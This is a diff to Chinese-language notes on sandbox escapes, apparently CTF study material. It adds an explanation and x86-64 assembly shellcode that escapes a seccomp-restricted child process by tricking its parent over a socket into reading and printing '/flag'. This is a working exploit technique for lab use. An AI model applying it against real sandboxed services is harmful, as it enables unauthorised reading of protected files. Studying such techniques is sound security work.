@@ -496,8 +496,39 @@ file_path:
 ```
 
 # 3. 父子进程+ seccomp 逃逸<br>
-该场景下，子进程只能跟父进程进行通信，且运用seccomp导致子进程只能使用`("read","write","exit")`这3个系统调用，我们应该如何实现逃逸<br>
+该场景下，子进程只能跟父进程进行通信，且运用seccomp导致子进程只能使用`("read","write","exit")`这3个系统调用，核心思想是通过操纵子进程的执行来达到操作父进程输出我们所需的信息<br>
 
+```asm
+.global _start
+_start:
+.intel_syntax noprefix
+mov rax, 1 #write
+mov rdi, 4 #assume child_socket fd = 4
+lea rsi, [rip+open_flag]
+mov rdx, 0x80
+syscall
+
+
+mov rax, 0 #read
+mov rdi, 4
+lea rsi, [rip+buffer+10]
+mov rdx, 0x80
+syscall
+
+mov rax, 1 #write
+mov rdi, 4
+lea rsi, [rip+buffer]
+mov rdx, 0x80
+syscall
+
+ret
+
+open_flag:
+.string "read_file:/flag"
+buffer:
+.string "print_msg:"
+.space 0x100
+```
 
 # 附录：利用chroot之前打开的目录/文件描述符 —— 手法<br>
 ## 附录A：程序本身在chroot之前已打开目录/文件描述符<br>
